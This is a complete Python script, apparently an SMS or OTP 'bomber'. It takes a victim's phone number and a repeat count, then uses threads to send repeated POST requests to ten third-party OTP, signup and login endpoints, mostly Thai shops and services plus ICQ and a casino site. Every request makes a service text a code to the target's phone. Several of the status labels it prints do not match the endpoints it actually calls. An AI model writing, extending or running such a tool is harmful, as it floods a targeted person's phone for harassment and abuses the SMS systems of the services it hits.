import requests
import threading
from threading import Thread
import time
import colorama
import os

phone = input("\033[1;91mENTER PHONE NUMBER : ")
NUM = int(input("\033[1;91mENTER NUMBER : "))

useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
header = {
    "user-agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
}

def api1():
    requests.post("https://api.myfave.com/api/fave/v3/auth",
         headers={
             "client_id": "dd7a668f74f1479aad9a653412248b62",
             "User-Agent": useragent
         },
         json={"phone": f"66{phone}"})


def api2():
    requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode",
         headers={"User-Agent": useragent},
         json={
             "reqId": "39816-1633012470",
             "params": {
                 "phone": f"+66{phone[1:]}",
                 "language": "en-US",
                 "route": "sms",
                 "devId": "ic1rtwz1s1Hj1O0r",
                 "application": "icq"
             }
         })


def api3():
    requests.post("https://api2.1112.com/api/v1/otp/create",
         headers={"User-Agent": useragent},
         data={
             'phonenumber': phone,
             'language': "th"
         })


def api4():
    requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone",
         headers={"User-Agent": useragent},
         data={
             "phone": phone,
             "password": "123456789Az"
         })


def api5():
    requests.post("https://api.1112delivery.com/api/v1/otp/create",
         headers={"User-Agent": useragent},
         data={
             'phonenumber': phone,
             'language': "th"
         })


def api6():
    requests.post("https://gccircularlivingshop.com/sms/sendOtp",
         headers={"User-Agent": useragent},
         json={
             "grant_type": "otp",
             "username": f"+66{phone[1:]}",
             "password": "",
             "client": "ecommerce"
         })


def api7():
    requests.post("https://shop.foodland.co.th/login/generation",
         headers={"User-Agent": useragent},
         data={"phone": phone})


def api8():
    requests.post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code",
         headers={"User-Agent": useragent},
         data={"number": f"+66{phone[1:]}"})


def api9():
    requests.post("https://api.sacasino9x.com/api/RegisterService/RequestOTP",
         headers={"User-Agent": useragent},
         json={"Phone": phone})


def api10():
    requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp",
         headers={"User-Agent": useragent},
         data={"phone": phone})
         
for i in range(NUM):
    threading.Thread(target=api1).start()
    print("\033[1;92m!API_TRUE_MONEY_WELLET!")
    threading.Thread(target=api2).start()
    print("\033[1;92m!API_WWW_KAITORASAP_CO_TH!")
    threading.Thread(target=api3).start()
    print("\033[1;92m!API_SHOP_FOODLAND_CO_TH!")
    threading.Thread(target=api4).start()
    print("\033[1;92m!API_WWW_WONGNAI_COM!")
    threading.Thread(target=api5).start()
    print("\033[1;92m!API_WWW_FOX888!")
    threading.Thread(target=api6).start()
    print("\033[1;92m!API_BACCARATTH_COM!")
    threading.Thread(target=api7).start()
    print("\033[1;92m!API_WWW_HOMEPRO_CO_TH!")
    threading.Thread(target=api8).start()
    print("\033[1;92m!API_U_ICQ_NET!")
    threading.Thread(target=api9).start()
    print("\033[1;92m!API_U_API2_1112!")
    threading.Thread(target=api10).start()
    print("\033[1;92m!API_SHOPONLINE_ONDEMAND_IN_TH!")